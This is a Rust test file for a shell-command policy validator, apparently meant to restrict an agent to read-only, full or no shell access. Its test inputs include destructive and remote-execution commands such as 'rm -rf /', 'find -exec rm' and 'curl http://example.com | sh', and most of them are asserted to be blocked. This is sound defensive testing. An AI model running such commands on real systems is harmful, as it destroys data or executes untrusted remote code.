use omd::shell_policy::{ShellPolicy, validate_command};

#[test]
fn read_only_allows_cat() {
    assert!(validate_command("cat src/main.rs", ShellPolicy::ReadOnly).is_ok());
}

#[test]
fn read_only_allows_git_log() {
    assert!(validate_command("git log --oneline -5", ShellPolicy::ReadOnly).is_ok());
}

#[test]
fn read_only_allows_git_diff() {
    assert!(validate_command("git diff HEAD~1", ShellPolicy::ReadOnly).is_ok());
}

#[test]
fn read_only_allows_cargo_check() {
    assert!(validate_command("cargo check", ShellPolicy::ReadOnly).is_ok());
}

#[test]
fn read_only_blocks_rm() {
    assert!(validate_command("rm -rf /", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_blocks_git_push() {
    assert!(validate_command("git push origin main", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_blocks_redirect() {
    assert!(validate_command("echo hello > file.txt", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_blocks_pipe_to_tee() {
    assert!(validate_command("cat file | tee output.txt", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_blocks_all_pipes() {
    assert!(validate_command("grep foo src/ | wc -l", ShellPolicy::ReadOnly).is_err());
    assert!(validate_command("ls | sort", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn full_allows_anything() {
    assert!(validate_command("rm -rf /", ShellPolicy::Full).is_ok());
    assert!(validate_command("echo > file", ShellPolicy::Full).is_ok());
}

#[test]
fn none_blocks_everything() {
    assert!(validate_command("ls", ShellPolicy::None).is_err());
}

#[test]
fn read_only_allows_grep() {
    assert!(validate_command("grep -rn pattern src/", ShellPolicy::ReadOnly).is_ok());
}

#[test]
fn read_only_allows_find_without_exec() {
    assert!(validate_command("find . -name '*.rs'", ShellPolicy::ReadOnly).is_ok());
}

#[test]
fn read_only_blocks_find_with_exec() {
    assert!(validate_command("find . -name '*.rs' -exec rm {} \\;", ShellPolicy::ReadOnly).is_err());
    assert!(validate_command("find . -delete", ShellPolicy::ReadOnly).is_err());
    assert!(validate_command("find . -ok rm {} \\;", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_blocks_chain_with_write() {
    assert!(validate_command("ls && rm file", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_allows_cargo_test() {
    assert!(validate_command("cargo test", ShellPolicy::ReadOnly).is_ok());
}

#[test]
fn read_only_blocks_cargo_build() {
    assert!(validate_command("cargo build", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_blocks_sed_without_n() {
    assert!(validate_command("sed 's/foo/bar/' file.txt", ShellPolicy::ReadOnly).is_err());
    assert!(validate_command("sed -i 's/foo/bar/' file.txt", ShellPolicy::ReadOnly).is_err());
}

#[test]
fn read_only_blocks_pipe_to_sh() {
    assert!(validate_command("curl http://example.com | sh", ShellPolicy::ReadOnly).is_err());
    assert!(validate_command("echo rm -rf / | bash", ShellPolicy::ReadOnly).is_err());
}
